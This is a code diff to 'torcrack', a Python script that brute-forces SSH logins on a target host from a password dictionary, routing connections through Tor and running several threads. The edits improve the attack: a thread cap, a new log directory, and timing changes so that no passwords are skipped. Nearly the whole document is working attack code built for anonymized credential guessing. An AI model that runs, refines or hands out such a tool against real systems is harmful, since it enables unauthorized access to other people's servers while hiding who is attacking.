@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 
 #norksec torcrack - (c) 2016 no rights reserved
 
@@ -27,8 +27,6 @@ from threading import Thread
 from queue import Queue
 from time import sleep
 
-running = 0
-
 def cls():
 	os.system('cls' if os.name=='nt' else 'clear')
 
@@ -42,7 +40,7 @@ def exit_handler():
 
 def ssh_connect(password, code = 0):
 	global running
-	paramiko.util.log_to_file("paramiko.log")
+	paramiko.util.log_to_file(".logs/paramiko.log")
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	print(' [*] Testing password: ' + password)
@@ -75,9 +73,13 @@ def is_valid_ipv4(address):
 	return True
 
 def main():
+	if not os.path.exists("./.logs"):
+		os.makedirs("./.logs")
+	global running
+	running = 0
 	atexit.register(exit_handler)
-	parser = optparse.OptionParser('%prog -t <target> -p <target port> -u <username> -d <dictionary/pass list> -P tor port (optional, default: 9050) -m max threads (optional, default: 4)')
-	parser.add_option('-m', dest='maxThreads', type='int', help='specify maximum number of threads (optional: default 4)')
+	parser = optparse.OptionParser('%prog -t <target> -p <target port> -u <username> -d <dictionary/pass list> -P tor port (optional, default: 9050) -m max threads (optional, default: 4, maximum: 10)')
+	parser.add_option('-m', dest='maxThreads', type='int', help='specify maximum number of threads (optional: default 4, maximum 10)')
 	parser.add_option('-P', dest='torPort', type='int', help='specify Tor port (optional: default 9050)')
 	parser.add_option('-t', dest='tgtHost', type='string', help='specify target (required)')
 	parser.add_option('-u', dest='tgtUser', type='string', help='specify username (required')
@@ -108,8 +110,15 @@ def main():
 	if (options.maxThreads == None):
 		maxThreads = 4
 	else:
-		maxThreads = options.maxThreads
-	print('\n [+] Max Threads set to ' + str(maxThreads))
+		if (options.maxThreads > 10):
+			print(' [-] Maximum number of threads can not exceed 10.')
+			maxThreads = 10
+		elif (options.maxThreads < 1):
+			print(' [-] Maximum number of threads must be greater than 0 (come on, now.)')
+			maxThreads = 4
+		else:
+			maxThreads = options.maxThreads
+	print(' [+] Max Threads set to ' + str(maxThreads))
 	print(' [+] ' + options.tgtHost + ' resolved to ' + str(tgtHost))
 	print(' [+] Target locked: ' + str(tgtHost) + ':' + str(tgtPort))
 	print(' [+] Tor Port set to: ' + str(torPort))
@@ -141,12 +150,13 @@ def main():
 		q.put(password)
 	while (q.qsize() > 0):
 		if running < maxThreads:
-			global running
 			running += 1
 			passW = q.get()
 			worker = Thread(target=ssh_connect, args=(passW,))
 			worker.start()
-			sleep(1.5)
+			sleep(1.25) #allow time for ssh banners to be properly captured, if the delay is too short it causes read errors which can cause the script to skip submitting some passwords
+	print(' [+] Reached end of dictionary file, waiting for threads to complete...')
+	sleep(running*2) #give the script 2 seconds per running thread to finish pulling banners and checking them before declaring no password found
 	print(' [+] Password not found; Shutting down.')
 
 if __name__ == '__main__':
